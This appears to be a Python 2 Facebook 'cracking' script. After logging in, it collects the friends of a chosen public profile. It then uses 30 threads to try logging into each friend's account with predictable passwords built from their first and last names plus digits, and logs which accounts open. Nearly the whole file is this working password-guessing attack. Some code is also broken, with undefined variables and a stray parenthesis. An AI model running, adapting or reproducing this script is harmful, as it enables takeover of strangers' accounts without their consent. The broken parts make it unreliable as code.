#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('Error404.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

####Browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
'\033[1;94m'
'\033[1;91m'
'\033[1;92m'
'\033[1;97m'
'\033[1;96m'
'\033[1;95m'
#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def love():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def hacker(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### token remove ####
def trb():
    os.system('rm -rf token.txt')

##### LOGO #####
logo1='''
\033[1;95m
✵_________________________________s$s
║______________________________ss$$$s
║_________________________s$$$$$$$$s
║_________$$$$$$$______s$$$$$$$$$s
║$________$$$$$$$$___$$$$$$$$$$$$
$$________$$$$$$$$$_$$$$$$$$$$$$$
$$_______$$$$$$$$$$$$$$$$$$$sss$
$$_______$$$$$$$$$$$$$$$$$$$$$$s
s$$s_______s$$$$$$$$$$$$$$$$$$$$
_$$$$___sss$$$$$$$$$$$$$$$$$$$$$
__s$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$
______ssss$$$$$$$$$$$$$$$$$$s$$$$$
_________$$$$$$$$$$$$$$$$$$$$$$$$$
__________$$$$$$$$$$$$$$$$$$$$$$$$
____________$$$$$___$$$$$$$$$$$$$$$
_____________$$$$$$___$$$$$$$$$$$$$s
_____________$$$$$$$$__$$$$$$__$$$$$s
____________$$$$$$$$$$____$$$$__s$$$s
____________$$$$$$$$$$$$____s$$___$$s
___________$$$$$$$$$$$$$______$$$$$s
_________s$$$s$$$$$$_$$$$
_________s$$_$$$$$$_______________s$s_s
_________s$___s$$$$s___________s$$$$$$$$
_________s_____$$$$$___$$$$$$$$$$$
________________$$$$_s$$$$$$s
_________________$$$$$$$s
__________________$$$$
___________________$$$$
____________________$$$$
_____________________$$$
______________________$$
______________________$$s
_______________________$$
______________________$$$
____________________$$
           '''
logo2='''
\033[1;93m
\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m  ▇▇  03094161457 ▇▇'''
logo3='''
\033[1;96m                        ,     ,
                        |\---/|
                       /  , , |
                  __.-'|  / \ /
         __ ___.-'        ._O|
      .-'  '        :      _/
     / ,    .        .     |
    :  ;    :        :   _/
    |  |   .'     __:   /
    |  :   /'----'| \  |
    \  |\  |      | /| |
     '.'| /       || \ |
     | /|.'       '.  \\_
     || ||             '-'
     '-''-'
           '''
back=0
successfull=[]
checkpoint=[]
live=[]
error=[]
id=[]
oks=[]

#### login ####
def login():
	love()
	try:
		tb=open('token.txt', 'r')
		menu() 
	except (KeyError,IOError):
		love()
		print (logo1)
                print (S + 46*'✵')
		print (S + '          ✵' + P + ' LOGIN WITH FACEBOOK ' + S + '✵')
		print (S + 46*'✵')
		id=raw_input(S + '[☆] ' + G + 'Number/ID: ' + W +'')
		pwd=getpass.getpass(S + '[☆] ' + G + 'Password : ')
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("token.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print (S + '[☆]' + G + ' Login successfull ✓')
		    os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print (R + 'Account has a checkpoint !')
		        t()
		        login()
		    else:
		        print (R + 'number/user id/ password is wrong !')
		        trb()
		        t()
		        login()
def menu():
	love()
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + 'Token Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (R + 'Account has a checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (R + 'No internet connection !')
		t()
		exb()
	love()
	print (logo2)
        print (S + 46*'✵')
	print (S + '[☆] ' + G + 'ID Name: ' + S + a['name'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
	print (S + 46*'✵')
	print (S + '[' + G + '1' + S + ']' + S + ' Crack Menu')
	print (S + '[' + R + '2' + S + ']' + P + ' Log Out')
	print (S + '[' + R + '0' + S + ']' + G + ' Exit')
	print (S + 46*'✵')
	print
	mafia()


def mafia():
	bm=raw_input(W + ' Slect Option   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mafia()
	elif bm =='1':
		pakistan()
	elif bm =='2':
		hacker('Token Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mafia()


def pakistan():
	global tb
	try:
		tb=open('token.txt','r').read()
	except IOError:
		print (R + ' Invalid Token !')
		trb()
		t()
		login()
	love()
	print (logo3)
        print (S + 46*'✵')
	print (S + '[' + G + '1' + S + ']' + S + ' Crack From Public Account')
	print (S + '[' + R + '0' + S + ']' + R + ' Back')
	print (S + 46*'✵')
	black()

def black():
	bp=raw_input(W + ' Slect Option  ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp=='1':
		love()
		print (logo3)
                print (S + 46*'✵')
		idt=raw_input(S + '[☆] ' + G + 'Public Frendlist ID: ' + W + '')
		love()
		print (logo3)
                print (S + 46*'✵')
		try:
			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)
			op=json.loads(jok.text)
			hacker(S + '[☆]' + G + ' Account  Name: ' + R + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pakistan()
		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[☆]' + G + ' Total Friends: ' + W + str(len(id)))
	hacker(S + '[☆]' + P + ' To stop process 1st click on CTRL then Z')
	print (S + 46*'✵')
	def main(arg):
		global error, live
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('786786')
			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[error] ✵ '+user+' ✵ '+ps1+' ✵ '+name)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[live] ✵ '+user+' ✵ '+ps1+' ✵ '+name)
			        oks.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'1234')
			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[error] ✵ '+user+' ✵ '+ps2+' ✵ '+name)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[live] ✵ '+user+' ✵ '+ps2+' ✵ '+name)
			                oks.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'786')
			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[error] ✵ '+user+' ✵ '+ps3+' ✵ '+name)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[live] ✵ '+user+' ✵ '+ps3+' ✵ '+name)
			                        oks.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[error] ✵ '+user+' ✵ '+ps4+' ✵ '+name)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[live] ✵ '+user+' ✵ '+ps4+' ✵ '+name)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[error] ✵ '+user+' ✵ '+ps5+' ✵ '+name)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[live] ✵ '+user+' ✵ '+ps5+' ✵ '+name)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=(j['first_name']+'123')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[error] ✵ '+user+' ✵ '+ps6+' ✵ '+name)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[live] ✵ '+user+' ✵ '+ps6+' ✵ '+name)
			                                                oks.append(user+ps6)
                                                                    else:
			                                                ps7=(j['first_name']+j['last_name'])
			                                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps7)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                                k=json.load(dt)
			                                                if 'www.facebook.com' in k['error_msg']:
			                                                    print(S+'[error] ✵ '+user+' ✵ '+ps7+' ✵ '+name)
			                                                    cps.append(user+ps7)
			                                                else:
			                                                    if 'access_token' in k:
			                                                        print(G+'[live] ✵ '+user+' ✵ '+ps7+' ✵ '+name)
			                                                        oks.append(user+ps7)  
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print(S+46*'✵')
	print(S+'Process has been completed')
	print(S+'Total '+G+'live'+S+'/'+R+'Error'+S+' = '+G+str(len(oks))+S+'/'+R+str(checkpoint)))
	print(P+'Please copy all data from screen')
	raw_input(R + 'Back')
	os.system('Error404.py')
if __name__=='__main__':
    login()

